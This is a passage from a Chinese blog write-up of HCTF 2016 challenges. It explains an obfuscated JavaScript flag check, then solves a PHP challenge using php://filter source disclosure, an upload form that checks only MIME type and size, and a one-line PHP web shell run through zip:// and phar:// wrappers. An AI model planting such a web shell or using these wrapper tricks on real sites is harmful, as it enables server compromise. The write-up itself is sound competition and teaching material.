class="number">3</span>].length - <span class="number">3</span>).toString(<span class="number">16</span>) + <span class="string">"53846"</span> + (<span class="keyword">new</span> <span class="built_in">Date</span>().getFullYear() - <span class="number">1</span> + <span class="string">""</span>);</div><div class="line">              <span class="comment">//这里不是65, 而可能是任何一个十六进制在[0-9]之间的字符。所以可以考虑的范围是并不是所有26个字符</span></div><div class="line">              <span class="comment">// d=parserInt(a,16) == "65531" + 65 +  53846 + "2015"</span></div><div class="line">              <span class="comment">// 这parseint(a, 16) == 6553165538462015</span></div><div class="line">              i = <span class="number">0xffff</span>;</div><div class="line">              n = (p = (f = _[$[<span class="number">23</span>]](o[<span class="number">3</span>].charAt(o[<span class="number">3</span>].length - <span class="number">4</span>), <span class="number">3</span>)) == o[<span class="number">3</span>].substring(<span class="number">1</span>, <span class="number">4</span>));</div><div class="line">              g = <span class="number">3</span>;</div><div class="line">              t = _[$[<span class="number">23</span>]](o[<span class="number">3</span>].charAt(<span class="number">3</span>), <span class="number">3</span>) == o[<span class="number">3</span>].substring(<span class="number">5</span>, <span class="number">8</span>) &amp;&amp; o[<span class="number">3</span>].charCodeAt(<span class="number">1</span>) * o[<span class="number">0</span>].charCodeAt(<span class="number">0</span>) == <span class="number">0x2ef3</span>;</div><div class="line">              <span class="comment">// o[3]的第四位重复3遍与 o[3]的 5,6,7 相等， 分别是 e, w</span></div><div class="line">              h = ((<span class="number">31249</span>*g) &amp; i).toString(<span class="number">16</span>); <span class="comment">// h的值是6e33</span></div><div class="line"></div><div class="line">              i = _[$[<span class="number">31</span>]](o[<span class="number">3</span>].split(f).join(<span class="string">""</span>).substring(<span class="number">0</span>, <span class="number">2</span>)).split(<span class="string">"x"</span>)[<span class="number">1</span>];</div><div class="line">              s = i == h;</div><div class="line">              <span class="keyword">return</span> (p &amp; t &amp; s &amp; d) === <span class="number">1</span> || (p &amp; t &amp; s &amp; d) === <span class="literal">true</span>;</div><div class="line">          &#125; <span class="keyword">catch</span> (e) &#123;</div><div class="line">              <span class="built_in">console</span>.log(<span class="string">"gg"</span>);</div><div class="line">              <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">          &#125;</div><div class="line">      &#125;)();</div><div class="line"></div><div class="line">      <span class="comment">//document.getElementById("message").placeholder = correct ? "correct" : "wrong";</span></div><div class="line">      <span class="keyword">if</span> (correct) &#123;</div><div class="line">          alert(<span class="string">"Congratulations! you got it!"</span>);</div><div class="line">      &#125; <span class="keyword">else</span> &#123;</div><div class="line">          alert(<span class="string">"Sorry, you are wrong..."</span>);</div><div class="line">      &#125;</div><div class="line">  &#125;;</div><div class="line">check();</div></pre></td></tr></table></figure>
<h1 id="兵者多诡"><a href="#兵者多诡" class="headerlink" title="兵者多诡"></a>兵者多诡</h1><p>这题并不难，考点的是php的伪协议。</p>
<ul>
<li><p>首先是<code>php://filter</code><br> 通过<code>http://pics.hctf.io/home.php?fp=php://filter/convert.base64-encode/resource=upload/function</code>等可以读出<code>upload.php</code> 与 <code>function.php</code> 。 但是在请求flag.txt时有问题了，经检查是因为<code>../</code> 字符被检查到了之后，就是返回 no no no .</p>
<ul>
<li><p>upload.php<br>可以看出，除了size/type之外并没有检查其他的。所以可以上传任意类型的文件，只要修改请求头即可。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">include 'function.php';</div><div class="line">if(isset($_POST['submit']) &amp;&amp; !empty($_FILES['image']['tmp_name']))</div><div class="line">&#123;</div><div class="line">$name = $_FILES['image']['tmp_name'];</div><div class="line">$type = $_FILES['image']['type'];</div><div class="line">$size = $_FILES['image']['size'];</div><div class="line"></div><div class="line">if(!is_uploaded_file($name))</div><div class="line">&#123;</div><div class="line">    ?&gt;</div><div class="line">    &lt;div class="alert alert-danger" role="alert"&gt;图片上传失败,请重新上传&lt;/div&gt;</div><div class="line">    &lt;?php</div><div class="line">        exit;</div><div class="line">&#125;</div><div class="line"></div><div class="line">if($type !== 'image/png')</div><div class="line">&#123;</div><div class="line">    ?&gt;</div><div class="line">    &lt;div class="alert alert-danger" role="alert"&gt;只能上传PNG图片&lt;/div&gt;</div><div class="line">    &lt;?php</div><div class="line">        exit;</div><div class="line">&#125;</div><div class="line"></div><div class="line">if($size &gt; 10240)</div><div class="line">&#123;</div><div class="line">    ?&gt;</div><div class="line">    &lt;div class="alert alert-danger" role="alert"&gt;图片大小超过10KB&lt;/div&gt;</div><div class="line">    &lt;?php</div><div class="line">        exit;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$imagekey = create_imagekey();</div><div class="line">move_uploaded_file($name,"uploads/$imagekey.png");</div><div class="line"></div><div class="line">echo "&lt;script&gt;location.href='?fp=show&amp;imagekey=$imagekey'&lt;/script&gt;";</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>第二个协议是 <code>phar://</code> 与<code>zip://</code> 两个伪协议都是用来处理zip压缩文件的。 如用zip的话，可以这样写。</p>
<ul>
<li>创建一个php文件，内容为: <code>&lt;?php $_GET[&#39;param1&#39;]($_GET[&#39;param2&#39;]); ?&gt;</code></li>
<li><code>zip shell.zip shell.php</code> 将php文件压缩。</li>
<li><p>上传之后拿到生成的文件名，请求如下。可以得到路径。<br><img src="http://img.blog.csdn.net/20161127213746753" alt="zip://"></p>
</li>
<li><p>如果用<code>phar://</code> 协议，可以php的文件如下 :<code>&lt;?php print_r( scandir(&#39;/var/www/&#39;))  ?&gt;</code> 并压缩为zip文件。</p>
</li>
<li>上传之后用phar://请求：<br><img src="http://img.blog.csdn.net/20161127214545765" alt="phar://"></li>
<li>最后<code>http://pics.hctf.io/home.php?fp=php://filter/convert.base64-encode/resource=/var/www/Th1s_1s_F1a9</code> 来得到flag</li>
</ul>
</li>
</ul>
<p>#</p>

      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="/2017/01/18/hctf-2016-write-up/">Hctf 2016 Write Up</a></p>
        <p><span>文章作者:</span><a href="/" title="回到主页">Shinpachi8</a></p>
        <p><span>发布时间:</span>2017-01-18, 20:27:42</p>
        <p><span>最后更新:</span>2017-01-18, 21:24:29</p>
        <p>
            <span>原始链接:</span><a class="post-url" href="/2017/01/18/hctf-2016-write-up/" title="Hctf 2016 Write Up">http://yoursite.com/2017/01/18/hctf-2016-write-up/</a>
            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2017/01/18/hctf-2016-write-up/　　作者: Shinpachi8" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>



    <nav id="article-nav">
        
            <div id="article-nav-newer" class="article-nav-title">
                <a href="/2017/01/18/xxe漏洞及xxe练习/">
                    Xxe漏洞及xxe练习
                </a>
            </div>
        
        
            <div id="article-nav-older" class="article-nav-title">
                <a href="/2017/01/16/hello-world/">
                    Hello World
                </a>
            </div>
        
    </nav>

  
</article>

    <div id="toc" class="toc-article">
        <strong class="toc-title">文章目录</strong>
        
            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#签到题"><span class="toc-number">1.</span> <span class="toc-text">签到题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2099年的flag"><span class="toc-number">2.</span> <span class="toc-text">2099年的flag</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RESTFUL"><span class="toc-number">3.</span> <span class="toc-text">RESTFUL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#giligili"><span class="toc-number">4.</span> <span class="toc-text">giligili</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#兵者多诡"><span class="toc-number">5.</span> <span class="toc-text">兵者多诡</span></a></li></ol>
        
    </div>
    <style>
        .left-col .switch-btn,
        .left-col .switch-area {
            display: none;
        }
        .toc-level-5 i,
        .toc-level-5 ol {
            display: none !important;
        }
    </style>

    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">

    <script>
        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
    </script>



    
<div class="share">
    
        <div class="bdsharebuttonbox">
            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
        </div>
        <script>
            window._bd_share_config={
                "common":{"bdSnsKey":{},"bdText":"Hctf 2016 Write Up　| shin's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
        </script>
    

    
</div>







    
      <div class="duoshuo" id="comments">
    <div id="comment-box" ></div>
    <div class="ds-thread" id="ds-thread" data-thread-key="2017/01/18/hctf-2016-write-up/" data-title="Hctf 2016 Write Up" data-url="http://yoursite.com/2017/01/18/hctf-2016-write-up/"></div>
    <script>
        var duoshuoQuery = {short_name:"shinpachi8"};
        var loadComment = function(){
            var d = document, s = d.createElement('script');
            s.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
            s.async = true; s.charset = 'UTF-8';
            (d.head || d.body).appendChild(s);
        }

        
            // Add comment count
            $(function(){ 
                var jsonUrl = "http://api.duoshuo.com/threads/counts.jsonp?short_name=shinpachi8&threads=2017/01/18/hctf-2016-write-up/&callback=?";
                $.getJSON(jsonUrl, function(result){
                    $.each(result.response, function(i, field){
                        var value = field.comments;
                        if (value > 0) {
                            $(".count-comment").text(value);
                            return;
                        }
                    })
                })
            })
        
    </script>
    
    <aside class="comment-bar">
        <a href="javascript:void(0);">
            <i class="fa fa-commenting-o animated infinite pulse"></i>
            <i class="fa fa-spinner fa-pulse"></i>
            <span class="count-comment"></span>
        </a>
    </aside>
    <script>
        var $commentBar = $("#comments aside.comment-bar");
        var load$hide = function(){
            $commentBar.find("a > i").toggle();
            loadComment();
            $commentBar.fadeOut(800);
        }
        $commentBar.click(function(){
            load$hide();
        })
        $commentBar.children("a").hover(function(){
            load$hide();
        })
        if (window.location.hash === "#comments") {
            load$hide();
        }
    </script>

</div>
    




    <div class="scroll" id="post-nav-button">
        
            <a href="/2017/01/18/xxe漏洞及xxe练习/" title="上一篇: Xxe漏洞及xxe练习">
                <i class="fa fa-angle-left"></i>
            </a>
        

        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>

        
            <a href="/2017/01/16/hello-world/" title="下一篇: Hello World">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>

    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/07/28/xss编码/">Xss编码</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/16/centos切换python2-7/">centos切换python2.7</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/12/信息收集工具之处理subDomainBrute结果/">信息收集工具之处理subDomainBrute结果</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/03/python多线程中setDaemon与join的问题/">python多线程中setDaemon与join的问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/20/bluecms-v1-6-audit/">Bluecms-v1.6-Audit</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/17/njctf2017-writeup-md/">Njctf2017-Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/04/redis利用小结/">Redis利用小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/22/lfi/">本地文件包含简单练习</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/19/xnuca/">Xnuca</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/18/xxe漏洞及xxe练习/">Xxe漏洞及xxe练习</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/18/hctf-2016-write-up/">Hctf 2016 Write Up</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/16/hello-world/">Hello World</a></li></ul>




    <script>
        
    </script>
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                <i class="fa fa-copyright"></i> 
                2016-2017 Shinpachi8
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>| </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>
    </div>
    
<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>

    <script>
        $(document).ready(function() {
            var iPad = window.navigator.userAgent.indexOf('iPad');
            if (iPad > -1 || $(".left-col").css("display") === "none") {
                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
            }
            else {
                var backgroundnum = 6;
                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
            }
        })
    </script>





<div class="scroll" id="scroll">
    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    // Open in New Window
    
        var oOpenInNew = {
            
            
            
            
            
            
             archives: ".archive-article-title", 
             miniArchives: "a.post-list-link", 
            
             friends: "#js-friends a", 
             socail: ".social a" 
        }
        for (var x in oOpenInNew) {
            $(oOpenInNew[x]).attr("target", "_blank");
        }
    
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
  </div>
</body>
</html>